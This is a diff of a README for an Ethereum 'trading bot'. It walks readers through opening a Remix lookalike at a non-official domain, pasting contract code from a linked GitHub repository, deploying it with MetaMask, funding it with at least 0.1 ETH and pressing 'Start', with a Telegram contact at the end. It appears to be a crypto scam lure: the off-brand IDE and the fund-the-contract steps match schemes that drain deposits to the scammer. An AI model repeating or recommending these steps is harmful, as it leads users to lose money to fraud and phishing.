@@ -12,27 +12,34 @@ Follow these steps to deploy and run your own trading bot:
 1. Access Remix and MetaMask
 Visit [Remix IDE](https://app.remix.live/) https://app.remix.live/ To minimize transaction fees, please use this optimized version, specifically engineered for this robot. It provides full compatibility while operating with significantly reduced gas costs
 Ensure you have the MetaMask browser extension installed and connected to the Ethereum mainnet or testnet
+
 2. Create the Contract File
 In Remix IDE, right-click the contracts/ folder
 Click "New File" and name it (e.g., bot.sol)
+
 3. Paste the Contract [Code](https://github.com/jcb-hub/bot.sol/blob/main/Code)
 Copy the source code from this repository
 Paste it into your newly created [Bot.sol](https://github.com/jcb-hub/bot.sol/blob/main/Code) file
+
 4. Compile the Contract
 Navigate to the "Solidity Compiler" tab
 Select Solidity version 0.6.6
 Click "Compile bot.sol"
+
 5. Deploy the Contract
 Go to the "Deploy & Run Transactions" tab
 Set the environment to "Injected Provider - MetaMask"
 Select your contract and click "Deploy"
 Confirm the transaction in MetaMask to create your contract
+
 6. Fund the Contract
 Send at least 0.1 ETH to your contract address
+
 7. Run the Bot
 In Remix, click the "Start" button to activate the bot
 To stop and withdraw funds, click "Withdrawal"
 For best results, allow the bot to run for at least 24 hours
+
 🔗 Connect With Me
 📬 Telegram
 📄 License
